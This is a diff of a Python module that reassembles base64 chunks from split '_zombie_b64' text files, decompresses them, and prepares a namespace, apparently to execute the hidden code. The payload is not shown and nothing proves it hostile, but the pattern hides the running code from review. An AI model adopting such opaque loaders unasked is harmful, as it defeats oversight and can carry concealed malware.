@@ -7,8 +7,25 @@ import zlib
 from pathlib import Path
 
 _dir = Path(__file__).resolve().parent
-_parts = sorted(_dir.glob("_zombie_b64_*.txt"), key=lambda p: int(p.stem.split("_")[-1]))
-_b64 = "".join(p.read_text(encoding="ascii") for p in _parts)
+
+def _collect(prefix: str) -> str:
+    # Prefer plain _prefix_N.txt; also stitch Na/Nb if present
+    parts = []
+    n = 0
+    while True:
+        plain = _dir / f"{prefix}_{n}.txt"
+        a = _dir / f"{prefix}_{n}a.txt"
+        b = _dir / f"{prefix}_{n}b.txt"
+        if plain.is_file():
+            parts.append(plain.read_text(encoding="ascii"))
+        elif a.is_file() or b.is_file():
+            parts.append((a.read_text(encoding="ascii") if a.is_file() else "") + (b.read_text(encoding="ascii") if b.is_file() else ""))
+        else:
+            break
+        n += 1
+    return "".join(parts)
+
+_b64 = _collect("_zombie_b64")
 _CODE = zlib.decompress(base64.b64decode(_b64)).decode("utf-8")
 _ns = globals()
 _ns.setdefault("__name__", __name__)
